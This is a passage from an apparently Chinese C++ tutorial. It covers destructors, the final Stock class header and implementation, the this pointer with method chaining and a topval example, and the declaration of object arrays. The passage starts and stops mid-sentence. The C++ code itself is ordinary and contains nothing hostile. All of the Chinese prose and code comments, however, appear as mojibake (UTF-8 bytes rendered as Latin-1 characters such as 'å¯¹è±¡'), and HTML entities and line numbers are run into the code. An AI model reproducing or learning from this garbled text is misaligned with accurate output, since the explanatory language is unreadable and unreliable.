å¯¹è±¡çš„ä½œç”¨åŸŸç»“æŸæ—¶ï¼ˆå¯¹äºè‡ªåŠ¨å­˜å‚¨å¯¹è±¡ï¼Œå¦‚å‡½æ•°å†…çš„å±€éƒ¨å¯¹è±¡ï¼‰ã€‚ å½“å¯¹æŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆè°ƒç”¨ delete æ—¶ï¼ˆå¯¹äºåŠ¨æ€å­˜å‚¨å¯¹è±¡ï¼‰ã€‚ å½“åŒ…å«è¯¥å¯¹è±¡çš„å¯¹è±¡è¢«é”€æ¯æ—¶ã€‚ å£°æ˜è¯­æ³• (åœ¨ç±»å®šä¹‰å†…): 123456class ClassName &#123;public: // ... æ„é€ å‡½æ•°å’Œå…¶ä»–æˆå‘˜ ... // ææ„å‡½æ•°å£°æ˜ ~ClassName();&#125;; å®šä¹‰è¯­æ³• (åœ¨ç±»å¤–éƒ¨): 123ClassName::~ClassName() &#123; // æ¸…ç†ä»£ç &#125; ç¤ºä¾‹ï¼šä¸º Stock ç±»æ·»åŠ ææ„å‡½æ•° å¯¹äºæˆ‘ä»¬å½“å‰çš„ Stock ç±»ï¼Œå®ƒå¹¶æ²¡æœ‰åœ¨å†…éƒ¨ä½¿ç”¨ new åˆ†é…å†…å­˜ï¼Œæ‰€ä»¥ææ„å‡½æ•°ä¸æ˜¯ä¸¥æ ¼å¿…éœ€çš„ã€‚ä½†ä¸ºäº†æ¼”ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥æ·»åŠ ä¸€ä¸ªç®€å•çš„ææ„å‡½æ•°ã€‚ 12345678910// åœ¨ stock.h çš„ç±»å®šä¹‰ä¸­å£°æ˜class Stock &#123; // ... private members ...public: // ... constructors ... // ... other public methods ... // ææ„å‡½æ•°å£°æ˜ ~Stock();&#125;; 12345678910111213// åœ¨ stock.cpp ä¸­å®šä¹‰ææ„å‡½æ•°#include &lt;iostream&gt;#include &quot;stock.h&quot;// ... constructor definitions ...// ... other method definitions ...// ææ„å‡½æ•°å®šä¹‰Stock::~Stock() &#123; // å¯¹äºè¿™ä¸ªç®€å•çš„ Stock ç±»ï¼Œæ²¡ä»€ä¹ˆéœ€è¦æ˜¾å¼æ¸…ç†çš„ // ä½†æˆ‘ä»¬å¯ä»¥åŠ ä¸€æ¡æ‰“å°è¯­å¥æ¥è§‚å¯Ÿå®ƒä½•æ—¶è¢«è°ƒç”¨ std::cout &lt;&lt; &quot;Bye, &quot; &lt;&lt; company &lt;&lt; &quot;!\\n&quot;;&#125; è§‚å¯Ÿææ„å‡½æ•°çš„è°ƒç”¨: 123456789101112131415161718192021#include &lt;iostream&gt;#include &quot;stock.h&quot;int main() &#123; &#123; // åˆ›å»ºä¸€ä¸ªå†…éƒ¨ä½œç”¨åŸŸ std::cout &lt;&lt; &quot;--- Entering inner block ---\\n&quot;; Stock stock1(&quot;Smart Comp&quot;, 50, 5.0); Stock stock2(&quot;Great Gadgets&quot;, 10, 12.0); std::cout &lt;&lt; &quot;--- Exiting inner block ---\\n&quot;; // å½“ç¦»å¼€è¿™ä¸ªä½œç”¨åŸŸæ—¶ï¼Œstock2 å’Œ stock1 (æŒ‰ç›¸åé¡ºåºåˆ›å»º) ä¼šè¢«é”€æ¯ &#125; // stock2 çš„ææ„å‡½æ•°å…ˆè°ƒç”¨ï¼Œç„¶åæ˜¯ stock1 çš„ std::cout &lt;&lt; &quot;--- Creating dynamic stock ---\\n&quot;; Stock *p_stock = new Stock(&quot;Dynamic Duo&quot;, 25, 2.5); p_stock-&gt;show(); std::cout &lt;&lt; &quot;--- Deleting dynamic stock ---\\n&quot;; delete p_stock; // è°ƒç”¨ææ„å‡½æ•°ï¼Œç„¶åé‡Šæ”¾å†…å­˜ std::cout &lt;&lt; &quot;--- main() is ending ---\\n&quot;; return 0;&#125; å¯èƒ½çš„è¾“å‡º: 12345678910111213--- Entering inner block ---Constructor using Smart Comp calledConstructor using Great Gadgets called--- Exiting inner block ---Bye, Great Gadgets!Bye, Smart Comp!--- Creating dynamic stock ---Constructor using Dynamic Duo calledCompany: Dynamic Duo Shares: 25 Share Price: $2.500 Total Worth: $62.50--- Deleting dynamic stock ---Bye, Dynamic Duo!--- main() is ending --- æ³¨æ„ææ„å‡½æ•°è°ƒç”¨çš„æ—¶æœºå’Œé¡ºåºï¼ˆå¯¹äºå±€éƒ¨å¯¹è±¡ï¼Œä¸æ„é€ é¡ºåºç›¸åï¼‰ã€‚ 10.3.5 æ”¹è¿› Stock ç±»ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥æ•´åˆæ„é€ å‡½æ•°å’Œææ„å‡½æ•°ï¼Œå¾—åˆ°ä¸€ä¸ªæ›´å®Œå–„ï¼ˆè™½ç„¶åœ¨è¿™ä¸ªä¾‹å­ä¸­ææ„å‡½æ•°ä½œç”¨ä¸å¤§ï¼‰çš„ Stock ç±»ã€‚ stock.h (æœ€ç»ˆç‰ˆæœ¬) 1234567891011121314151617181920212223242526272829// filepath: d:\\ProgramData\\files_Cpp\\250424\\stock.h#ifndef STOCK_H_#define STOCK_H_#include &lt;string&gt;class Stock &#123;private: std::string company; long shares; double share_val; double total_val; void set_tot() &#123; total_val = shares * share_val; &#125;public: // æ„é€ å‡½æ•° Stock(); // é»˜è®¤æ„é€ å‡½æ•° Stock(const std::string &amp;co, long n = 0, double pr = 0.0); // ææ„å‡½æ•° ~Stock(); // å…¶ä»–æˆå‘˜å‡½æ•° void buy(long num, double price); void sell(long num, double price); void update(double price); void show() const;&#125;;#endif // STOCK_H_ stock.cpp (æœ€ç»ˆç‰ˆæœ¬) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677// filepath: d:\\ProgramData\\files_Cpp\\250424\\stock.cpp#include &lt;iostream&gt;#include &quot;stock.h&quot;// æ„é€ å‡½æ•°å®šä¹‰Stock::Stock() &#123; company = &quot;no name&quot;; shares = 0; share_val = 0.0; total_val = 0.0;&#125;Stock::Stock(const std::string &amp;co, long n, double pr) &#123; company = co; if (n &lt; 0) &#123; std::cerr &lt;&lt; &quot;Error: Number of shares can&#x27;t be negative. &quot; &lt;&lt; company &lt;&lt; &quot; shares set to 0.\\n&quot;; // ä½¿ç”¨ cerr è¾“å‡ºé”™è¯¯ shares = 0; &#125; else &#123; shares = n; &#125; share_val = pr; set_tot();&#125;// ææ„å‡½æ•°å®šä¹‰Stock::~Stock() &#123; // åœ¨è¿™ä¸ªç®€å•ç±»ä¸­ï¼Œææ„å‡½æ•°ä½“å¯ä»¥ä¸ºç©º // std::cout &lt;&lt; &quot;Destructor called for &quot; &lt;&lt; company &lt;&lt; &quot;\\n&quot;; // å¯ä»¥å–æ¶ˆæ³¨é‡Šæ¥è§‚å¯Ÿ&#125;// å…¶ä»–æˆå‘˜å‡½æ•°å®šä¹‰void Stock::buy(long num, double price) &#123; if (num &lt; 0) &#123; std::cerr &lt;&lt; &quot;Error: Number of shares purchased can&#x27;t be negative. &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else &#123; shares += num; share_val = price; set_tot(); &#125;&#125;void Stock::sell(long num, double price) &#123; if (num &lt; 0) &#123; std::cerr &lt;&lt; &quot;Error: Number of shares sold can&#x27;t be negative. &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else if (num &gt; shares) &#123; std::cerr &lt;&lt; &quot;Error: You can&#x27;t sell more than you have! &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else &#123; shares -= num; share_val = price; set_tot(); &#125;&#125;void Stock::update(double price) &#123; share_val = price; set_tot();&#125;void Stock::show() const &#123; // ä½¿ç”¨ iomanip æ¥è®¾ç½®æ ¼å¼å¯èƒ½æ›´æ¸…æ™° std::ios_base::fmtflags orig = std::cout.setf(std::ios_base::fixed, std::ios_base::floatfield); std::streamsize prec = std::cout.precision(3); std::cout &lt;&lt; &quot;Company: &quot; &lt;&lt; company &lt;&lt; &quot; Shares: &quot; &lt;&lt; shares &lt;&lt; &#x27;\\n&#x27;; std::cout &lt;&lt; &quot; Share Price: $&quot; &lt;&lt; share_val; std::cout.precision(2); std::cout &lt;&lt; &quot; Total Worth: $&quot; &lt;&lt; total_val &lt;&lt; &#x27;\\n&#x27;; std::cout.setf(orig, std::ios_base::floatfield); std::cout.precision(prec);&#125; 10.3.6 æ„é€ å‡½æ•°å’Œææ„å‡½æ•°å°ç»“ æ„é€ å‡½æ•°: ä¸ç±»åŒåï¼Œæ— è¿”å›ç±»å‹ã€‚ åœ¨åˆ›å»ºå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œç”¨äºåˆå§‹åŒ–å¯¹è±¡ã€‚ å¯ä»¥é‡è½½ï¼ˆæä¾›ä¸åŒçš„å‚æ•°åˆ—è¡¨ï¼‰ã€‚ å¦‚æœæ²¡æœ‰å®šä¹‰ä»»ä½•æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªé»˜è®¤æ„é€ å‡½æ•°ï¼ˆæ— å‚æ•°ï¼Œä»€ä¹ˆä¹Ÿä¸åšï¼‰ã€‚ å¦‚æœå®šä¹‰äº†ä»»ä½•æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¸å†ç”Ÿæˆé»˜è®¤æ„é€ å‡½æ•°ï¼›å¦‚æœéœ€è¦æ— å‚æ•°æ„é€ ï¼Œå¿…é¡»è‡ªå·±å®šä¹‰ã€‚ ææ„å‡½æ•°: ç±»åå‰åŠ  ~ï¼Œæ— è¿”å›ç±»å‹ï¼Œæ— å‚æ•°ã€‚ åœ¨å¯¹è±¡é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œç”¨äºæ¸…ç†èµ„æºã€‚ ä¸èƒ½é‡è½½ï¼Œä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªææ„å‡½æ•°ã€‚ å¦‚æœç±»ä¸­ä½¿ç”¨äº† new åˆ†é…èµ„æºï¼Œé€šå¸¸éœ€è¦åœ¨ææ„å‡½æ•°ä¸­ä½¿ç”¨ delete æ¥é‡Šæ”¾ã€‚ æ„é€ å‡½æ•°å’Œææ„å‡½æ•°æ˜¯ C++ ç±»æœºåˆ¶çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå®ƒä»¬ç¡®ä¿äº†å¯¹è±¡çš„æ­£ç¡®åˆå§‹åŒ–å’Œèµ„æºçš„å®‰å…¨é‡Šæ”¾ï¼Œæ˜¯å®ç°èµ„æºè·å–å³åˆå§‹åŒ– (RAII - Resource Acquisition Is Initialization) è¿™ä¸€é‡è¦ C++ ç¼–ç¨‹èŒƒå¼çš„åŸºçŸ³ã€‚ 10.4 this æŒ‡é’ˆåœ¨ C++ ç±»çš„æˆå‘˜å‡½æ•°å†…éƒ¨ï¼Œä½ æœ‰æ—¶å¯èƒ½éœ€è¦å¼•ç”¨è°ƒç”¨è¯¥å‡½æ•°çš„å¯¹è±¡æœ¬èº«ã€‚ä¾‹å¦‚ï¼Œå½“ä½ åœ¨ stock1.show() çš„å®ç°ä»£ç ä¸­ï¼Œå¦‚ä½•æ˜ç¡®åœ°æŒ‡ä»£ stock1 è¿™ä¸ªå¯¹è±¡ï¼ŸC++ ä¸ºæ­¤æä¾›äº†ä¸€ä¸ªç‰¹æ®Šçš„æŒ‡é’ˆï¼Œç§°ä¸º this æŒ‡é’ˆã€‚ this æŒ‡é’ˆæ˜¯ä»€ä¹ˆï¼Ÿthis æ˜¯ä¸€ä¸ªéšå«çš„æŒ‡é’ˆï¼Œå®ƒå­˜åœ¨äºæ¯ä¸ªéé™æ€æˆå‘˜å‡½æ•°ï¼ˆnon-static member functionï¼‰å†…éƒ¨ã€‚å®ƒæŒ‡å‘è°ƒç”¨è¯¥æˆå‘˜å‡½æ•°çš„é‚£ä¸ªå¯¹è±¡ã€‚ å½“ä½ è°ƒç”¨ stock1.show() æ—¶ï¼Œåœ¨ show() å‡½æ•°çš„å†…éƒ¨ï¼Œthis æŒ‡é’ˆå°±æŒ‡å‘ stock1 å¯¹è±¡ã€‚ å½“ä½ è°ƒç”¨ stock2.buy(..) æ—¶ï¼Œåœ¨ buy() å‡½æ•°çš„å†…éƒ¨ï¼Œthis æŒ‡é’ˆå°±æŒ‡å‘ stock2 å¯¹è±¡ã€‚ ç¼–è¯‘å™¨åœ¨è°ƒç”¨æˆå‘˜å‡½æ•°æ—¶ï¼Œä¼šéšå¼åœ°å°†å¯¹è±¡çš„åœ°å€ä¼ é€’ç»™è¯¥å‡½æ•°ï¼Œè¿™ä¸ªåœ°å€å°±è¢« this æŒ‡é’ˆæ‰€æŒæœ‰ã€‚ å…³é”®ç‚¹ï¼š éšå«å‚æ•°: this æŒ‡é’ˆæ˜¯ä½œä¸ºéšå«å‚æ•°ä¼ é€’ç»™éé™æ€æˆå‘˜å‡½æ•°çš„ã€‚ä½ ä¸éœ€è¦åœ¨å‡½æ•°å‚æ•°åˆ—è¡¨ä¸­æ˜¾å¼å£°æ˜å®ƒã€‚ æŒ‡å‘è°ƒç”¨å¯¹è±¡: å®ƒæ€»æ˜¯æŒ‡å‘å½“å‰æ­£åœ¨æ‰§è¡Œå…¶æˆå‘˜å‡½æ•°çš„é‚£ä¸ªå¯¹è±¡ã€‚ ç±»å‹: this æŒ‡é’ˆçš„ç±»å‹æ˜¯ ClassName * constï¼ˆå¯¹äºé const æˆå‘˜å‡½æ•°ï¼‰æˆ– const ClassName * constï¼ˆå¯¹äº const æˆå‘˜å‡½æ•°ï¼‰ã€‚è¿™æ„å‘³ç€ this æŒ‡é’ˆæœ¬èº«æ˜¯ä¸€ä¸ªå¸¸é‡æŒ‡é’ˆï¼ˆä¸èƒ½è®©å®ƒæŒ‡å‘å…¶ä»–å¯¹è±¡ï¼‰ï¼Œå¹¶ä¸”å¯¹äº const æˆå‘˜å‡½æ•°ï¼Œå®ƒæŒ‡å‘ä¸€ä¸ª const å¯¹è±¡ï¼ˆä¸èƒ½é€šè¿‡ this ä¿®æ”¹å¯¹è±¡çš„æ•°æ®æˆå‘˜ï¼‰ã€‚ è®¿é—®æˆå‘˜: åœ¨æˆå‘˜å‡½æ•°å†…éƒ¨ï¼Œå½“ä½ ç›´æ¥è®¿é—®æ•°æ®æˆå‘˜ï¼ˆå¦‚ sharesï¼‰æˆ–è°ƒç”¨å…¶ä»–æˆå‘˜å‡½æ•°ï¼ˆå¦‚ set_tot()ï¼‰æ—¶ï¼Œå®é™…ä¸Šæ˜¯ç¼–è¯‘å™¨éšå¼åœ°ä½¿ç”¨äº† this æŒ‡é’ˆï¼Œç­‰åŒäº this-&gt;shares æˆ– this-&gt;set_tot()ã€‚ ä½¿ç”¨ this æŒ‡é’ˆå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä½ ä¸éœ€è¦æ˜¾å¼åœ°ä½¿ç”¨ this æŒ‡é’ˆï¼Œå› ä¸ºç¼–è¯‘å™¨ä¼šè‡ªåŠ¨å¤„ç†ã€‚ä¾‹å¦‚ï¼Œåœ¨ Stock::buy å‡½æ•°ä¸­ï¼š 1234567891011121314void Stock::buy(long num, double price) &#123; if (num &lt; 0) &#123; // ... &#125; else &#123; // shares += num; // éšå¼ä½¿ç”¨ this-&gt;shares // share_val = price; // éšå¼ä½¿ç”¨ this-&gt;share_val // set_tot(); // éšå¼è°ƒç”¨ this-&gt;set_tot() // ä¸‹é¢æ˜¯æ˜¾å¼ä½¿ç”¨ this çš„ç­‰æ•ˆå†™æ³•ï¼š this-&gt;shares += num; this-&gt;share_val = price; this-&gt;set_tot(); &#125;&#125; ç„¶è€Œï¼Œåœ¨æŸäº›ç‰¹å®šåœºæ™¯ä¸‹ï¼Œæ˜¾å¼ä½¿ç”¨ this æŒ‡é’ˆæ˜¯å¿…è¦çš„æˆ–æœ‰ç”¨çš„ï¼š åŒºåˆ†åŒåå‚æ•°å’Œæˆå‘˜: å½“æˆå‘˜å‡½æ•°çš„å‚æ•°åä¸æ•°æ®æˆå‘˜åç›¸åŒæ—¶ï¼Œéœ€è¦ä½¿ç”¨ this-&gt; æ¥æ˜ç¡®æŒ‡å®šè®¿é—®çš„æ˜¯æ•°æ®æˆå‘˜ã€‚ 1234567891011121314151617class Example &#123;private: int value;public: // å‚æ•°å value ä¸æ•°æ®æˆå‘˜ value ç›¸åŒ Example(int value) &#123; // å¿…é¡»ä½¿ç”¨ this-&gt;value æ¥å¼•ç”¨æ•°æ®æˆå‘˜ this-&gt;value = value; &#125; void print() const &#123; std::cout &lt;&lt; value &lt;&lt; std::endl; &#125; // è¿™é‡Œè®¿é—®çš„æ˜¯æˆå‘˜ value&#125;;int main() &#123; Example ex(10); // è°ƒç”¨æ„é€ å‡½æ•° ex.print(); // è¾“å‡º 10 return 0;&#125; (è™½ç„¶è¿™ç§å‘½åæ–¹å¼æœ‰æ—¶ä¼šç”¨åˆ°ï¼Œä½†ä¸€äº›ç¼–ç è§„èŒƒå»ºè®®é¿å…å‚æ•°åå’Œæˆå‘˜åå®Œå…¨ç›¸åŒï¼Œä¾‹å¦‚ä½¿ç”¨ m_value æˆ– value_ ä½œä¸ºæˆå‘˜å) è¿”å›å¯¹è±¡è‡ªèº«çš„å¼•ç”¨æˆ–æŒ‡é’ˆ: å½“æˆå‘˜å‡½æ•°éœ€è¦è¿”å›è°ƒç”¨è¯¥å‡½æ•°çš„å¯¹è±¡æœ¬èº«æ—¶ï¼ˆé€šå¸¸æ˜¯ä¸ºäº†æ”¯æŒ**æ–¹æ³•é“¾å¼è°ƒç”¨ (Method Chaining)**ï¼‰ã€‚ 12345678910111213141516171819202122232425262728293031class Counter &#123;private: int count = 0;public: Counter&amp; increment() &#123; // è¿”å›ç±»å‹æ˜¯ Counter&amp; count++; return *this; // è¿”å›è°ƒç”¨å¯¹è±¡è‡ªèº«çš„å¼•ç”¨ &#125; Counter&amp; add(int val) &#123; // è¿”å›ç±»å‹æ˜¯ Counter&amp; count += val; return *this; // è¿”å›è°ƒç”¨å¯¹è±¡è‡ªèº«çš„å¼•ç”¨ &#125; void display() const &#123; std::cout &lt;&lt; &quot;Count: &quot; &lt;&lt; count &lt;&lt; std::endl; &#125;&#125;;int main() &#123; Counter c; c.display(); // Output: Count: 0 // æ–¹æ³•é“¾å¼è°ƒç”¨ c.increment().add(5).increment(); // å…ˆè°ƒç”¨ increment(), è¿”å› c çš„å¼•ç”¨ï¼› // å†å¯¹ c è°ƒç”¨ add(5), è¿”å› c çš„å¼•ç”¨ï¼› // æœ€åå¯¹ c è°ƒç”¨ increment() c.display(); // Output: Count: 7 return 0;&#125; åœ¨ increment() å’Œ add() ä¸­ï¼Œreturn *this; è¿”å›çš„æ˜¯è°ƒç”¨å¯¹è±¡ï¼ˆcï¼‰çš„å¼•ç”¨ï¼Œä½¿å¾—å¯ä»¥åœ¨å…¶åç»§ç»­è°ƒç”¨è¯¥å¯¹è±¡çš„å…¶ä»–æˆå‘˜å‡½æ•°ã€‚ åœ¨å‹å…ƒå‡½æ•°æˆ–ç‹¬ç«‹å‡½æ•°ä¸­ä¼ é€’å¯¹è±¡: è™½ç„¶ this æœ¬èº«åªåœ¨æˆå‘˜å‡½æ•°å†…å¯ç”¨ï¼Œä½†ä½ å¯ä»¥å°† *thisï¼ˆå¯¹è±¡æœ¬èº«ï¼‰æˆ– thisï¼ˆå¯¹è±¡åœ°å€ï¼‰ä¼ é€’ç»™éœ€è¦æ“ä½œè¯¥å¯¹è±¡çš„å…¶ä»–å‡½æ•°ã€‚ this ä¸ Stock ç±»è®©æˆ‘ä»¬çœ‹çœ‹ this å¦‚ä½•åº”ç”¨äºä¹‹å‰çš„ Stock ç±»ã€‚å‡è®¾æˆ‘ä»¬æƒ³æ·»åŠ ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºæ¯”è¾ƒä¸¤ä¸ª Stock å¯¹è±¡çš„æ€»ä»·å€¼ï¼Œå¹¶è¿”å›æ€»ä»·å€¼è¾ƒé«˜çš„é‚£ä¸ªå¯¹è±¡çš„å¼•ç”¨ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// åœ¨ stock.h çš„ç±»å®šä¹‰ä¸­æ·»åŠ å£°æ˜class Stock &#123; // ... private members ...public: // ... constructors, destructor, buy, sell, update, show ... // æ–°å¢æ–¹æ³•ï¼šæ¯”è¾ƒæ€»ä»·å€¼ï¼Œè¿”å›ä»·å€¼æ›´é«˜çš„å¯¹è±¡çš„å¼•ç”¨ // ç¬¬ä¸€ä¸ªconstï¼ˆè¿”å›å€¼å‰ï¼‰ï¼šè¡¨ç¤ºè¿”å›çš„å¼•ç”¨æ˜¯å¸¸é‡ï¼Œä¸èƒ½è¢«ä¿®æ”¹ // ç¬¬äºŒä¸ªconstï¼ˆå‚æ•°ä¸­ï¼‰ ï¼šè¡¨ç¤ºå‚æ•°æ˜¯å¸¸é‡å¼•ç”¨ï¼Œå‡½æ•°å†…ä¸èƒ½ä¿®æ”¹å‚æ•° // ç¬¬ä¸‰ä¸ªconstï¼ˆå‡½æ•°æœ«å°¾ï¼‰ï¼šè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå¸¸é‡æˆå‘˜å‡½æ•°ï¼Œä¸èƒ½ä¿®æ”¹è°ƒç”¨å¯¹è±¡çš„æˆå‘˜å˜é‡ const Stock&amp; topval(const Stock&amp; s) const;&#125;;// åœ¨ stock.cpp ä¸­æ·»åŠ å®šä¹‰#include &quot;stock.h&quot;// ... å…¶ä»–å®šä¹‰ ...// å®šä¹‰ topval æ–¹æ³•const Stock&amp; Stock::topval(const Stock&amp; s) const &#123; // this-&gt;total_val æ˜¯è°ƒç”¨è¯¥æ–¹æ³•çš„å¯¹è±¡ (e.g., stock1) çš„æ€»ä»·å€¼ // s.total_val æ˜¯ä¼ å…¥çš„å‚æ•°å¯¹è±¡ (e.g., stock2) çš„æ€»ä»·å€¼ if (s.total_val &gt; this-&gt;total_val) &#123; return s; // è¿”å›ä¼ å…¥çš„å¯¹è±¡ s &#125; else &#123; return *this; // è¿”å›è°ƒç”¨è¯¥æ–¹æ³•çš„å¯¹è±¡è‡ªèº« (*this) &#125; // æ³¨æ„ï¼šå‡½æ•°å£°æ˜å’Œå®šä¹‰æœ«å°¾çš„ const è¡¨ç¤ºæ­¤å‡½æ•°ä¸ä¼šä¿®æ”¹ä»»ä½• Stock å¯¹è±¡ï¼Œ // å› æ­¤ this çš„ç±»å‹æ˜¯ const Stock* constï¼Œ*this çš„ç±»å‹æ˜¯ const Stock&amp;&#125;// ä½¿ç”¨ç¤ºä¾‹#include &lt;iostream&gt;#include &quot;stock.h&quot;int main() &#123; Stock stock1(&quot;Company A&quot;, 100, 10.0); // total_val = 1000.0 Stock stock2(&quot;Company B&quot;, 50, 25.0); // total_val = 1250.0 stock1.show(); stock2.show(); const Stock&amp; top = stock1.topval(stock2); // è°ƒç”¨ stock1.topvalï¼Œä¼ å…¥ stock2 // å†…éƒ¨æ¯”è¾ƒ s(stock2).total_val å’Œ this(stock1)-&gt;total_val // å› ä¸º stock2 ä»·å€¼æ›´é«˜ï¼Œè¿”å› stock2 çš„å¼•ç”¨ std::cout &lt;&lt; &quot;\\nTop value stock:\\n&quot;; top.show(); // æ˜¾ç¤ºçš„æ˜¯ stock2 çš„ä¿¡æ¯ return 0;&#125; åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œthis-&gt;total_val æ˜ç¡®è¡¨ç¤ºè®¿é—®çš„æ˜¯è°ƒç”¨ topval å‡½æ•°çš„é‚£ä¸ªå¯¹è±¡ï¼ˆstock1ï¼‰çš„ total_val æˆå‘˜ï¼Œè€Œ s.total_val è®¿é—®çš„æ˜¯ä½œä¸ºå‚æ•°ä¼ é€’è¿›æ¥çš„å¯¹è±¡ï¼ˆstock2ï¼‰çš„ total_valã€‚return *this; åˆ™è¿”å›äº†è°ƒç”¨å¯¹è±¡ stock1 æœ¬èº«çš„å¼•ç”¨ã€‚ æ€»ç»“ this æ˜¯ä¸€ä¸ªæŒ‡å‘è°ƒç”¨å¯¹è±¡çš„æŒ‡é’ˆï¼Œåœ¨éé™æ€æˆå‘˜å‡½æ•°å†…éƒ¨å¯ç”¨ã€‚ å®ƒä½¿å¾—æˆå‘˜å‡½æ•°èƒ½å¤Ÿè®¿é—®å’Œæ“ä½œè°ƒç”¨å®ƒçš„é‚£ä¸ªç‰¹å®šå¯¹è±¡çš„æ•°æ®æˆå‘˜å’Œæˆå‘˜å‡½æ•°ã€‚ å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œthis çš„ä½¿ç”¨æ˜¯éšå¼çš„ã€‚ æ˜¾å¼ä½¿ç”¨ this ä¸»è¦ç”¨äºï¼š åŒºåˆ†åŒåçš„å‚æ•°å’Œæ•°æ®æˆå‘˜ã€‚ ä»æˆå‘˜å‡½æ•°ä¸­è¿”å›è°ƒç”¨å¯¹è±¡è‡ªèº«çš„å¼•ç”¨æˆ–æŒ‡é’ˆï¼ˆå¸¸ç”¨äºæ–¹æ³•é“¾ï¼‰ã€‚ this æŒ‡é’ˆçš„ç±»å‹å–å†³äºæˆå‘˜å‡½æ•°æ˜¯å¦ä¸º constã€‚ 10.5 å¯¹è±¡æ•°ç»„å°±åƒå¯ä»¥åˆ›å»º intã€double æˆ– char çš„æ•°ç»„ä¸€æ ·ï¼Œä½ ä¹Ÿå¯ä»¥åˆ›å»ºç±»å¯¹è±¡çš„æ•°ç»„ã€‚æ•°ç»„çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªè¯¥ç±»çš„å¯¹è±¡ã€‚ å£°æ˜å¯¹è±¡æ•°ç»„å£°æ˜å¯¹è±¡æ•°ç»„çš„è¯­æ³•ä¸å£°æ˜åŸºæœ¬ç±»å‹æ•°ç»„ç±»ä¼¼ï¼š 1ClassName arrayName[numberOfElements]; ä¾‹å¦‚ï¼Œè¦åˆ›å»ºä¸€ä¸ªåŒ…å« 4 ä¸ª Stock å¯¹è±¡çš„æ•°ç»„ï¼š 1234#include &quot;stock.h&quot; // å‡è®¾ Stock ç±»å®šä¹‰åœ¨æ­¤const int STKS = 4;Stock myStocks[STKS]; // åˆ›å»ºä¸€ä¸ªåŒ…å« 4 ä¸ª Stock å¯¹è±¡çš„æ•°ç»„ æ„é€ å‡½æ•°çš„è°ƒç”¨å½“ç¨‹åºåˆ›å»ºå¯¹è±¡æ•°ç»„æ—¶ï¼Œå®ƒéœ€è¦ä¸ºæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼ˆå¯¹è±¡ï¼‰è°ƒç”¨æ„é€ å‡½æ•°ã€‚ é»˜è®¤æ„é€ å‡½æ•°: å¦‚æœåœ¨å£°æ˜æ•°ç»„æ—¶æ²¡æœ‰ä¸ºå…ƒç´ æä¾›æ˜¾å¼çš„åˆå§‹åŒ–å€¼ï¼Œç¨‹åºå°†ä¸ºæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è°ƒç”¨ç±»çš„**é»˜è®¤æ„é€ å‡½æ•° (Default Constructor)**ã€‚ åœ¨ä¸Šé¢çš„ä¾‹å­ Stock myStocks[STKS]; ä¸­ï¼ŒStock::Stock() è¿™ä¸ªé»˜è®¤æ„é€ å‡½æ•°å°†è¢«è°ƒç”¨ 4 æ¬¡ï¼Œä¸º myStocks[0], myStocks[1], myStocks[2], myStocks[3] è¿™å››ä¸ªå¯¹è±¡è¿›è¡Œåˆå§‹åŒ–ã€‚ é‡è¦: å¦‚æœç±»æ²¡æœ‰é»˜è®¤æ„é€ å‡½æ•°ï¼ˆä¾‹å¦‚ï¼Œä½ åªå®šä¹‰äº†å¸¦å‚æ•°çš„æ„é€ å‡½æ•°ï¼Œè€Œæ²¡æœ‰å®šä¹‰æ— å‚æ•°çš„æ„é€ å‡½æ•°æˆ–ä½¿ç”¨ = defaultï¼‰ï¼Œé‚£ä¹ˆå°è¯•åˆ›å»ºåƒ Stock myStocks[STKS]; è¿™æ ·çš„æœªåˆå§‹åŒ–æ•°ç»„å°†å¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚ å¸¦å‚æ•°çš„æ„é€ å‡½æ•°: ä½ å¯ä»¥åœ¨å£°æ˜æ•°ç»„æ—¶ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨æ¥ä¸ºæ•°ç»„å…ƒç´ æŒ‡å®šä¸åŒçš„æ„é€ å‡½æ•°è°ƒç”¨ã€‚ 1234567891011121314#include &quot;stock.h&quot;const int STKS = 2;Stock portfolio[STKS] = &#123; Stock(&quot;NanoSmart&quot;, 12, 20.0), // è°ƒç”¨ Stock(const string&amp;, long, double) Stock(&quot;Boffo Objects&quot;, 200, 2.0) // è°ƒç”¨ Stock(const string&amp;, long, double)&#125;;// C++11 åŠä»¥åç‰ˆæœ¬å¯ä»¥ä½¿ç”¨æ›´ç®€æ´çš„åˆ—è¡¨åˆå§‹åŒ–Stock investments[] = &#123; // ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è®¡ç®—æ•°ç»„å¤§å° (3) Stock(&quot;Fleep Co&quot;, 5, 15.5), Stock(), // è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•° Stock() Stock(&quot;MacroHard&quot;, 18, 75.0)&#125;; åœ¨ portfolio æ•°ç»„çš„ä¾‹å­ä¸­ï¼Œportfolio[0] ä½¿ç”¨æä¾›çš„å‚æ•°è°ƒç”¨ Stock(const string&amp;, long, double) æ„é€ å‡½æ•°ï¼Œportfolio[1] ä¹Ÿä¸€æ ·ã€‚ åœ¨ investments æ•°ç»„çš„ä¾‹å­ä¸­ï¼Œinvestments[0] å’Œ investments[2] è°ƒç”¨å¸¦å‚æ•°çš„æ„é€ 